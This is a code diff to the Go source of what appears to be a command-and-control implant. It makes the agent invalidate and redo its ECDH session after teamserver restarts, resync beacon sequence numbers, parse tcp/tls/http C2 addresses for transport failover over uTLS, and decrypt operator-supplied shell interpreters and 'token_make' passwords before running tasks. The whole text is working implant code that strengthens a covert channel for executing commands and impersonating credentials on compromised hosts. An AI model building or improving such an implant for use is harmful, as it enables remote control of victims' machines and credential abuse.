@@ -1324,9 +1324,13 @@ func doBeacon() {
 			return
 		}
 		if env.CipherB64 == "" {
-			// No ciphertext: this may be a server resync signal (our sequence
-			// fell behind). Apply it if the MAC verifies, otherwise ignore.
+			// No ciphertext: server resync (seq behind/ahead after downtime)
+			// or a dropped session. Snap to last_seq and handshake next.
 			tryResync(respBody)
+			if ecdhSess != nil {
+				ecdhSess.invalidate()
+			}
+			inFastMode.Store(true)
 			return
 		}
 		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(frameSeq, 10))
@@ -1507,6 +1511,12 @@ func sendToC2(idx int, body []byte) []byte {
 		if Debug {
 			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
 		}
+		// Teamserver restart drops the in-memory ECDH session; the next loop
+		// must handshake instead of forever replaying ciphertext into 400s.
+		if ecdhSess != nil {
+			ecdhSess.invalidate()
+		}
+		inFastMode.Store(true)
 		return nil
 	}
 
@@ -1609,16 +1619,21 @@ func sendBeacon(body []byte) []byte {
 }
 
 // sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
-// C2URL should be host:port (or tcp://host:port) when Protocol=="tcp".
+// The C2 URL may be tcp://host:port, tls://host:port, or an http(s) URL whose
+// host:port is reused after transport failover — never dial the raw URL.
 func sendTCPBeacon(body []byte) []byte {
-	addr := strings.TrimPrefix(C2URL, "tcp://")
-	addr = strings.TrimPrefix(addr, "tls://")
+	addr, scheme, ok := currentC2Dial()
+	if !ok {
+		if Debug {
+			fmt.Printf("[!] TCP beacon: cannot parse C2 address from %q\n", currentC2Raw())
+		}
+		return nil
+	}
 
 	var conn net.Conn
 	var err error
 
-	// Basic TLS support when SkipTLSVerify or using tls:// scheme
-	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
+	useTLS := c2UseTLS(scheme)
 	if useTLS {
 		conn, err = dialUTLSTCP("tcp", addr)
 	} else {
@@ -1683,12 +1698,13 @@ func tryResync(body []byte) {
 		return
 	}
 	seqMu.Lock()
-	behind := r.LastSeq > beaconSeq
-	if behind {
-		beaconSeq = r.LastSeq + 1
+	next := r.LastSeq + 1
+	changed := r.LastSeq > 0 && beaconSeq != next
+	if changed {
+		beaconSeq = next
 	}
 	seqMu.Unlock()
-	if behind {
+	if changed {
 		persistBeaconState()
 		inFastMode.Store(true)
 		if Debug {
@@ -1891,13 +1907,15 @@ func executeTask(task Task) TaskResult {
 				return res
 			}
 		}
-		// Shell rides a secret for token_make (the plaintext password), so it
-		// is encrypted by the server with the same AAD binding.
+		// Shell is the interpreter for shell/ps (cmd.exe, /bin/sh) and a
+		// secret for token_make. Older teamservers left the interpreter in
+		// the clear; treat decrypt failure as plaintext unless this type
+		// always encrypts Shell (token_make password).
 		if task.Shell != "" {
 			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Shell, aad)
 			if err == nil {
 				task.Shell = string(dec)
-			} else {
+			} else if task.Type == "token_make" {
 				res.Error = "task payload decryption failed"
 				return res
 			}
